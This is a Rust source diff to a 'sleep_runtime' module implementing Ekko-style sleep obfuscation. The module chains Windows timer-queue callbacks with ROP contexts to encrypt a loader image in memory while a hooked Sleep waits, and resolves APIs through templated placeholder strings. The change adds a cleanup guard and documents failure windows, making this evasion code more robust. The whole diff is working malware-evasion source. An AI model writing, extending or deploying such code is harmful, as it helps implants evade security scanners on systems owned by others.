@@ -10,7 +10,7 @@ mod sleep_runtime {
     use std::mem::{size_of, transmute, transmute_copy};
 
     use windows::core::PCSTR;
-    use windows::Win32::Foundation::{GetLastError, HMODULE};
+    use windows::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, HMODULE};
     use windows::Win32::System::Diagnostics::Debug::{CONTEXT, IMAGE_NT_HEADERS64};
     use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
     use windows::Win32::System::Memory::{
@@ -157,12 +157,6 @@ mod sleep_runtime {
         }
     }
 
-    /// Resolves an export to a raw address, or `None` (best-effort lookups).
-    fn resolve_address(module: HMODULE, name: &str) -> Option<usize> {
-        let cname = std::ffi::CString::new(name).ok()?;
-        let address = unsafe { GetProcAddress(module, PCSTR(cname.as_ptr() as *const u8)) };
-        address.map(|function| function as usize)
-    }
 
     /// Queues one timer whose callback is the given continuation. The callback
     /// parameter is the ROP context itself, so when the timer fires the dispatch
@@ -192,6 +186,86 @@ mod sleep_runtime {
             }));
         }
         Ok(())
+    }
+
+    /// Owns the timer queue and the completion event of one sleep and tears
+    /// them down on every exit path.
+    ///
+    /// `ekko_sleep` creates it as soon as the event exists and attaches the
+    /// queue once `CreateTimerQueue` succeeds. The early returns from
+    /// `queue_timer(...)?` release both through `Drop`; the success path calls
+    /// [`EkkoCleanup::delete_queue`] and [`EkkoCleanup::close_event`]
+    /// explicitly. Both routes share the same flags, so neither handle is
+    /// deleted or closed twice.
+    ///
+    /// `DeleteTimerQueueEx` is resolved before any timer can be queued: without
+    /// it a partially queued chain could not be cancelled, so `ekko_sleep`
+    /// fails early instead of leaving a queue behind.
+    struct EkkoCleanup {
+        event: HANDLE,
+        queue: isize,
+        delete: FnDeleteTimerQueueEx,
+        queue_deleted: bool,
+        event_closed: bool,
+    }
+
+    impl EkkoCleanup {
+        /// Takes ownership of the event created before the queue exists.
+        fn new(event: HANDLE, delete: FnDeleteTimerQueueEx) -> Self {
+            Self {
+                event,
+                queue: 0,
+                delete,
+                queue_deleted: false,
+                event_closed: false,
+            }
+        }
+
+        /// Records the queue once `CreateTimerQueue` returned a valid handle.
+        fn attach_queue(&mut self, queue: isize) {
+            self.queue = queue;
+        }
+
+        /// Deletes the queue, waiting for in-flight callbacks.
+        ///
+        /// `INVALID_HANDLE_VALUE` (-1) as the completion event makes
+        /// `DeleteTimerQueueEx` block until every running callback has
+        /// returned, so the caller never resumes while a timer callback is
+        /// still executing. Pending timers are cancelled.
+        fn delete_queue(&mut self) {
+            if self.queue_deleted {
+                return;
+            }
+            self.queue_deleted = true;
+            let queue = self.queue;
+            self.queue = 0;
+            if queue == 0 {
+                return;
+            }
+            unsafe {
+                let _ = (self.delete)(queue, -1);
+            }
+        }
+
+        /// Closes the completion event exactly once.
+        fn close_event(&mut self) {
+            if self.event_closed {
+                return;
+            }
+            self.event_closed = true;
+            unsafe {
+                let _ = CloseHandle(self.event);
+            }
+        }
+    }
+
+    impl Drop for EkkoCleanup {
+        fn drop(&mut self) {
+            // Every early return lands here; the success path has already set
+            // both flags and this is a no-op.
+            self.delete_queue();
+            self.close_event();
+        }
     }
 
     /// Builds a continuation context: the captured timer-thread context with a
@@ -255,6 +329,27 @@ mod sleep_runtime {
     /// the call. The `sleep_obfuscation` step satisfies it because it encrypts
     /// the loader image while the pipeline is single-threaded; the `Sleep`
     /// proxy is responsible for its own guard.
+    ///
+    /// # Cleanup
+    ///
+    /// The completion event and the timer queue are owned by [`EkkoCleanup`]:
+    /// every early return (including a failed `queue_timer`) cancels the
+    /// pending chain, waits for an in-flight callback to return
+    /// (`DeleteTimerQueueEx` with `INVALID_HANDLE_VALUE`) and releases both
+    /// handles. Nothing is deleted or closed twice, and repeated `Sleep` hook
+    /// calls do not leak a kernel event each.
+    ///
+    /// # Failure
+    ///
+    /// Because the chain is cancelled on error, a `queue_timer` failure
+    /// *after* the first step fired can leave the region encrypted: the
+    /// decrypt and restore steps still pending are cancelled with the queue.
+    /// This is the one residual window. It is rare because the first step is
+    /// due `FIRST_STEP` ms (20 ms) after the capture while the whole chain is
+    /// queued in a few microseconds; hitting it requires this thread to be
+    /// descheduled for the entire first due time between two queue calls. The
+    /// caller never resumes while a callback is running — queue deletion waits
+    /// for it — but on this error path the region may no longer be plaintext.
     pub fn ekko_sleep(
         image_base: usize,
         image_size: usize,
@@ -293,9 +388,11 @@ mod sleep_runtime {
             &$CREATE_TIMER_QUEUE_TIMER_DEF$,
             step_error($MSG_CREATE_TIMER_QUEUE_TIMER_FAILED$, 0),
         )?;
-        let delete_timer_queue_ex: Option<FnDeleteTimerQueueEx> =
-            resolve_address(kernel32, &$DELETE_TIMER_QUEUE_EX_DEF$)
-                .map(|address| unsafe { transmute::<usize, FnDeleteTimerQueueEx>(address) });
+        let delete_timer_queue_ex: FnDeleteTimerQueueEx = resolve_as(
+            kernel32,
+            &$DELETE_TIMER_QUEUE_EX_DEF$,
+            step_error($MSG_CREATE_TIMER_QUEUE_FAILED$, 0),
+        )?;
         let wait_for_single_object: FnWaitForSingleObject = resolve_as(
             kernel32,
             &$WAIT_FOR_SINGLE_OBJECT_DEF$,
@@ -343,12 +440,16 @@ mod sleep_runtime {
                 GetLastError().0
             })
         })?;
+        // The guard owns the event from here on, so the `h_queue == 0` return
+        // and every `queue_timer(...)?` below close it exactly once.
+        let mut cleanup = EkkoCleanup::new(h_event, delete_timer_queue_ex);
         let h_queue = unsafe { create_timer_queue() };
         if h_queue == 0 {
             return Err(step_error($MSG_CREATE_TIMER_QUEUE_FAILED$, unsafe {
                 GetLastError().0
             }));
         }
+        cleanup.attach_queue(h_queue);
 
         // 3. Capture a timer-thread context for the continuation chain.
         let captured = AlignedContext(CONTEXT::default());
@@ -532,18 +633,13 @@ mod sleep_runtime {
         )?;
 
         // 6. Wait for the last step to signal completion, then tear the queue
-        //    down. By the time the event is set, every step (including the
-        //    delay) has already returned, so the queue deletion cannot block.
+        //    down. The final step signals before its own callback returns, so
+        //    deletion waits only for that callback to unwind.
         unsafe {
             wait_for_single_object(h_event.0 as isize, u32::MAX);
         }
-        if let Some(delete_timer_queue_ex) = delete_timer_queue_ex {
-            // The second handle is INVALID_HANDLE_VALUE: wait for every callback
-            // to have finished before returning to the caller.
-            unsafe {
-                delete_timer_queue_ex(h_queue, -1);
-            }
-        }
+        cleanup.delete_queue();
+        cleanup.close_event();
         Ok(())
     }
 
